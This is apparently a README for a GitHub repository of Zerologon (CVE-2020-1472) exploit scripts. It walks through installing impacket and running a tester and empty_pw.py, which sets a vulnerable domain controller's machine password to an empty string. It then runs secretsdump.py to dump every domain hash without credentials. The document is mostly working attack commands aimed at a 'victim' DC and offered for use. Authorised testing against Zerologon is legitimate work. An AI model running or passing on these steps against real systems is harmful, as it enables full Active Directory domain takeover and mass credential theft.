# Zerologon
Set of scripts, to test and exploit the zerologon vulnerability (CVE-2020-1472). 

***

# What is it?

ZeroLogon is a vulnerability that allows us to exploit a cryptography flaw in Microsoft's Active Directory Netlogon Remote Protocol (MS-NRPC), which allows users to log in to servers using NTLM. 

***

# Previous steps 

Before executing the exploit we must know that we need a different version of impacket, for this we will do the following. 

``> apt remove --purge impacket-scripts python3-impacket``

``> git clone https://github.com/SecureAuthCorp/impacket.git``

``> cd impacket``

``> pip install .``

***

# PoC (Proof Of Concept)

``git clone https://github.com/Nekoox/zerologon.git``

``cd zerologon``

``pip install -r requirements.txt``

## Check if the victim domain controller is vulnerable to zerologon.

``python3 tester.py <DC-NAME> <ip-address>``

In the event that the victim DC is vulnerable, a message will appear saying "Success! DC can be fully compromised by a Zerologon attack." 

Otherwise, that is, the victim DC is not vulnerable because the security hole has been patched, we will get the following message "Attack failed. Target is probably patched." 

***

## Change the password of the vulnerable domain controller to an empty string. 

``python3 empty_pw.py <DC-NAME> <ip-address>``

If the Domain Controller is vulnerable, after running the exploit it should not have any password. 


## Dump hashes of the Domain Controller. 

``> secretsdump.py -just-dc <DC-NAME>\$@<ip-address>``

By executing this, we will be able to see all the hashes of the domain, without any credentials. 

